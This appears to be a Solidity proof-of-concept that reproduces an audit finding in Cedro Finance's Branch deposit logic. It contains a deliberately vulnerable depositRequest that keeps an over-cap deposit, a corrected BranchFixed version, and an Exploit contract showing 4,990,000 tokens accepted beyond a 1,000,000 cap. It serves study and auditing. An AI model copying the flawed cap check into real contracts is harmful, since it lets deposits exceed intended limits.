// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Cedro Finance — depositRequest accepts the deposit that crosses the cap
    (Zokyo, 2024-03-19). Branch flags depositCapReached only after liquidity
    has already increased, and it does not revert. A 1_000_000 cap therefore
    keeps a 990_000 deposit and a following 5_000_000 deposit: 5_990_000 in
    custody, 4_990_000 above the cap. The fixed path reverts that second deposit. */

contract Matic {
    string public symbol = "MATIC";
    uint8 public constant decimals = 18;
    address public minter;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor() {
        minter = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Branch {
    error DepositCapReached(string tag, uint256 id);

    string public constant TAG = "BRANCH";
    Matic public matic;
    mapping(uint256 => bool) public depositCapReached;
    mapping(uint256 => uint256) public capAmount;
    mapping(uint256 => uint256) public liquidity;

    constructor(Matic _matic) {
        matic = _matic;
    }

    function setCap(uint256 id, uint256 cap) external {
        capAmount[id] = cap;
    }

    function depositRequest(uint256 id, uint256 amount) external {
        if (depositCapReached[id]) revert DepositCapReached(TAG, id);
        matic.transferFrom(msg.sender, address(this), amount);
        liquidity[id] += amount;
        if (liquidity[id] > capAmount[id]) { // @> VULN: the over-cap deposit is kept; the flag only blocks the next one
            depositCapReached[id] = true;
        }
    }
}

contract BranchFixed {
    error DepositCapReached(string tag, uint256 id);

    string public constant TAG = "BRANCH";
    Matic public matic;
    mapping(uint256 => uint256) public capAmount;
    mapping(uint256 => uint256) public liquidity;

    constructor(Matic _matic) {
        matic = _matic;
    }

    function setCap(uint256 id, uint256 cap) external {
        capAmount[id] = cap;
    }

    function depositRequest(uint256 id, uint256 amount) external {
        if (liquidity[id] + amount > capAmount[id]) revert DepositCapReached(TAG, id);
        matic.transferFrom(msg.sender, address(this), amount);
        liquidity[id] += amount;
    }
}

contract Alice {
    Matic public matic;
    Branch public branch;

    constructor(Matic _matic, Branch _branch) {
        matic = _matic;
        branch = _branch;
    }

    function deposit(uint256 id, uint256 amount) external {
        matic.approve(address(branch), amount);
        branch.depositRequest(id, amount);
    }
}

contract Exploit {
    Matic public matic; // nonce 1
    Branch public branch; // nonce 2
    Alice public alice; // nonce 3

    constructor() {
        matic = new Matic();
        branch = new Branch(matic);
        alice = new Alice(matic, branch);
    }

    function run() external {
        branch.setCap(0, 1_000_000 ether);
        matic.mint(address(alice), 990_000 ether);
        alice.deposit(0, 990_000 ether);
        require(branch.liquidity(0) == 990_000 ether, "under cap");
        require(!branch.depositCapReached(0), "flag early");
        matic.mint(address(this), 5_000_000 ether);
        matic.approve(address(branch), 5_000_000 ether);
        branch.depositRequest(0, 5_000_000 ether);
        require(branch.liquidity(0) == 5_990_000 ether, "5.99M kept");
        require(branch.capAmount(0) == 1_000_000 ether, "cap");
        require(branch.liquidity(0) - branch.capAmount(0) == 4_990_000 ether, "excess");
        require(branch.depositCapReached(0), "flag");
        require(matic.balanceOf(address(branch)) == 5_990_000 ether, "custody");
    }
}
